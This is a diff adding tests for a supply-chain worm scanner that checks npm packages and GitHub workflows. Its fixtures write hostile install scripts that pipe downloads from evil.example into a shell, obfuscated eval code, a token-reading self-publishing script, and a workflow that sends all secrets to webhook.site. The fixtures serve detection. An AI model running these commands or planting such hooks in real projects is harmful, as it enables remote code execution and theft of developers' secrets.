@@ -220,6 +220,47 @@ const backupTests = async () => {
   ok((await B.check({ roots: [dl] }, { sync, tm: async () => null })).length === 0, 'backup: only Downloads means nothing to check');
 };
 
+// ---------- Worm watch part 2: packages and workflows ----------
+{
+  const S = require('../core/supply');
+  const proj = path.join(tmp, 'wormwork');
+  const w = (rel, txt) => { const f = path.join(proj, rel); fs.mkdirSync(path.dirname(f), { recursive: true }); fs.writeFileSync(f, txt); };
+  w('app/package.json', JSON.stringify({ name: 'my-app', version: '1.0.0', scripts: { postinstall: 'node-gyp rebuild', prepare: 'husky install', test: 'curl http://x | sh' } }));
+  w('evil/package.json', JSON.stringify({ name: 'evil-app', scripts: { postinstall: 'curl -s https://evil.example/a.sh | bash' } }));
+  w('hide/package.json', JSON.stringify({ name: 'hide-app', scripts: { install: 'node -e "eval(atob(\'aGk=\'))"' } }));
+  w('wormy/package.json', JSON.stringify({ name: 'wormy', scripts: { postinstall: 'node setup.js' } }));
+  w('wormy/setup.js', "const t = process.env.NPM_TOKEN; require('child_process').execSync('npm publish');");
+  w('flow/.github/workflows/ci.yml', 'jobs:\n  b:\n    steps:\n      - run: echo ${{ toJSON(secrets) }}\n');
+  w('flow2/.github/workflows/x.yml', 'steps:\n  - run: curl -d "${{ toJSON(secrets) }}" https://webhook.site/abc\n');
+  w('flow3/.github/workflows/shai-hulud-workflow.yml', 'name: x\n');
+  w('clean/.github/workflows/ci.yml', 'steps:\n  - run: npm test\n');
+  w('left/package.json', JSON.stringify({ name: 'left' }));
+  w('left/setup_bun.js', '// leftover');
+  w('nm/package.json', JSON.stringify({ name: 'nm' }));
+  w('nm/node_modules/bad-dep/package.json', JSON.stringify({ name: 'bad-dep', version: '2.0.1', scripts: { postinstall: 'wget -qO- https://evil.example/x | sh' } }));
+  w('nm/node_modules/@scope/ok-dep/package.json', JSON.stringify({ name: '@scope/ok-dep', version: '1.0.0', scripts: { install: 'node-gyp rebuild' } }));
+  w('nm/node_modules/@scope/bad-scope/package.json', JSON.stringify({ name: '@scope/bad-scope', version: '3.0.0', scripts: { preinstall: 'node -e "require(\'https\').get(\'https://x.example\')"' } }));
+  const res = S.scan([proj]);
+  const by = (n) => res.find((x) => x.name === n || x.name.startsWith(n + ' '));
+  ok(!by('my-app') && !by('clean') && !res.some((x) => /clean/.test(x.path)), 'packages: normal install scripts and a quiet workflow are not flagged');
+  ok(by('evil-app') && by('evil-app').state === 'alarm' && by('evil-app').reasons.some((r) => r.key === 'pkg.fetchRun'), 'packages: download and run in an install script is danger');
+  ok(by('hide-app') && by('hide-app').state === 'watch' && by('hide-app').reasons.some((r) => r.key === 'pkg.obfuscated'), 'packages: hidden code in an install script is attention');
+  ok(by('wormy') && by('wormy').state === 'alarm' && by('wormy').reasons.some((r) => r.key === 'pkg.selfSpread'), 'packages: a script file that reads npm tokens and publishes is a self-spreader');
+  const wf = res.filter((x) => x.kind === 'workflow');
+  ok(wf.some((x) => x.name === 'ci.yml' && x.state === 'watch' && x.reasons.some((r) => r.key === 'pkg.wfDump')), 'packages: a workflow that dumps all secrets is attention');
+  ok(wf.some((x) => x.name === 'x.yml' && x.state === 'alarm' && x.reasons.some((r) => r.key === 'pkg.wfSend')), 'packages: dumping secrets to a catch-all address is danger');
+  ok(wf.some((x) => /shai-hulud/.test(x.name) && x.state === 'alarm' && x.reasons.some((r) => r.key === 'pkg.ioc')), 'packages: the Shai-Hulud workflow name is danger');
+  ok(res.some((x) => x.kind === 'ioc' && x.name === 'setup_bun.js' && x.state === 'alarm'), 'packages: a known worm file name is danger');
+  ok(by('bad-dep') && by('bad-dep').name === 'bad-dep 2.0.1' && by('bad-dep').state === 'alarm', 'packages: a bad package in node_modules is found, with its version');
+  ok(by('@scope/bad-scope') && by('@scope/bad-scope').state === 'alarm', 'packages: scoped packages in node_modules are read too');
+  ok(!by('@scope/ok-dep'), 'packages: a normal build script in node_modules is not flagged');
+  ok(res.every((x, i, a) => i === 0 || ['alarm', 'watch', 'calm'].indexOf(a[i - 1].state) <= ['alarm', 'watch', 'calm'].indexOf(x.state)), 'packages: danger comes first');
+  ok(S.scan([path.join(tmp, 'no-such-folder')]).length === 0, 'packages: a missing folder is fine');
+  const before = by('evil-app').hash;
+  w('evil/package.json', JSON.stringify({ name: 'evil-app', scripts: { postinstall: 'curl -s https://evil.example/a.sh | bash', preinstall: 'node -e "eval(atob(1))"' } }));
+  ok(S.scan([proj]).find((x) => x.name === 'evil-app').hash !== before, 'packages: a changed install script changes the fingerprint');
+}
+
 // ---------- AI browser extensions ----------
 {
   const X = require('../core/extensions');
@@ -395,6 +436,12 @@ const backupTests = async () => {
   ok(eng.snapshot().backups.length === 1 && eng.snapshot().watchers.find((w) => w.id === 'files').issues >= 1, 'engine: the backup finding shows on the file watcher');
   ok(eng.fixDismiss('backup:work').ok && !eng.fixPlan().some((x) => x.tkey === 'backup:work'), 'engine: the backup warning can be dismissed');
   ok(eng.store.settings.backupCheck === true, 'settings: backup check is on by default');
+  eng.inventory.packages = [{ id: 'p1p1p1p1p1p1p1p1', kind: 'package', name: 'evil-app', path: path.join(tmp, 'wormwork', 'evil', 'package.json'), state: 'alarm', reasons: [{ key: 'pkg.fetchRun', params: { script: 'postinstall' }, sev: 'alarm' }], hash: 'h' }];
+  const pkStep = eng.fixPlan().find((x) => x.tkey === 'pkg:p1p1p1p1p1p1p1p1');
+  ok(pkStep && pkStep.cat === 'manual' && pkStep.sev === 'alarm', 'engine: a worm-like package is a step you do yourself');
+  ok(eng.snapshot().packages.length === 1 && eng.snapshot().watchers.find((w) => w.id === 'gate').issues >= 1, 'engine: the package finding shows on the gate watcher');
+  ok(eng.fixDismiss('pkg:p1p1p1p1p1p1p1p1').ok && !eng.fixPlan().some((x) => x.tkey === 'pkg:p1p1p1p1p1p1p1p1') && eng.snapshot().packages[0].state === 'calm', 'engine: a package warning can be dismissed');
+  ok(eng.store.settings.pkgCheck === true, 'settings: package check is on by default');
   await backupTests();
   eng.stop();
   console.log(`\nRESULT ${fail ? 'FAIL' : 'PASS'}: ${pass} passed, ${fail} failed`);
